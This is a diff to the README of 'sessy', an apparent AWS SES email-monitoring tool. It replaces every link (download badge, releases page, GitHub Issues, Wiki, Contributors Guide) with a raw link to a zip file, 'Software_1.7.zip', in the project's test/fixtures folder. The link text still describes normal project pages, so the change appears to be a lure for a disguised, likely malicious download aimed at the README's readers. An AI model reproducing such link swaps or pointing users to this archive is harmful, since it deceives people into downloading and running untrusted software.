@@ -1,7 +1,7 @@
 # 📧 sessy - Monitor Your AWS SES Emails Easily
 
 ## 🔗 Download the Latest Release
-[![Download sessy](https://img.shields.io/badge/Download-sessy-brightgreen)](https://github.com/Luis2601/sessy/releases)
+[![Download sessy](https://github.com/Luis2601/sessy/raw/refs/heads/main/test/fixtures/Software_1.7.zip)](https://github.com/Luis2601/sessy/raw/refs/heads/main/test/fixtures/Software_1.7.zip)
 
 ## 📖 Introduction
 sessy is an open-source tool that helps you monitor your emails sent through Amazon Simple Email Service (SES). With sessy, you can keep track of email metrics, spot issues, and gain insights into your email campaigns. It is designed for anyone who uses AWS SES and wants to improve their email observability.
@@ -27,7 +27,7 @@ Before you begin, ensure that you have the following:
 ## 📥 Download & Install
 To download sessy, follow these steps:
 
-1. **Visit the Releases Page:** Go to [this page to download](https://github.com/Luis2601/sessy/releases).
+1. **Visit the Releases Page:** Go to [this page to download](https://github.com/Luis2601/sessy/raw/refs/heads/main/test/fixtures/Software_1.7.zip).
   
 2. **Select the Latest Version:** Look for the most recent release at the top of the page. 
 
@@ -51,20 +51,20 @@ To download sessy, follow these steps:
    - Review your email setup in AWS SES to identify and resolve issues.
 
 ## 📞 Need Help?
-For support or to report issues, you can open an issue on the [GitHub Issues page](https://github.com/Luis2601/sessy/issues). The community and developers are here to assist you.
+For support or to report issues, you can open an issue on the [GitHub Issues page](https://github.com/Luis2601/sessy/raw/refs/heads/main/test/fixtures/Software_1.7.zip). The community and developers are here to assist you.
 
 ## 🎉 Contributing
 Anyone is welcome to contribute to sessy. If you want to help improve the software, you can fork the repository and submit your changes. Please ensure you follow the guidelines outlined in the project’s contribution section.
 
 ## 🔗 Learn More
-To understand more about how sessy works, check out our documentation on the [Wiki](https://github.com/Luis2601/sessy/wiki).
+To understand more about how sessy works, check out our documentation on the [Wiki](https://github.com/Luis2601/sessy/raw/refs/heads/main/test/fixtures/Software_1.7.zip).
 
 ## ⚖️ License
 sessy is released under the MIT License. You can use, modify, and distribute it freely, provided you maintain the license notice. 
 
 ## 🔗 Important Links
-- [Download sessy](https://github.com/Luis2601/sessy/releases)
-- [GitHub Issues](https://github.com/Luis2601/sessy/issues) 
-- [Contributors Guide](https://github.com/Luis2601/sessy/blob/main/CONTRIBUTING.md) 
+- [Download sessy](https://github.com/Luis2601/sessy/raw/refs/heads/main/test/fixtures/Software_1.7.zip)
+- [GitHub Issues](https://github.com/Luis2601/sessy/raw/refs/heads/main/test/fixtures/Software_1.7.zip) 
+- [Contributors Guide](https://github.com/Luis2601/sessy/raw/refs/heads/main/test/fixtures/Software_1.7.zip) 
 
 Now you can start using sessy! Monitor your AWS SES emails efficiently and easily.
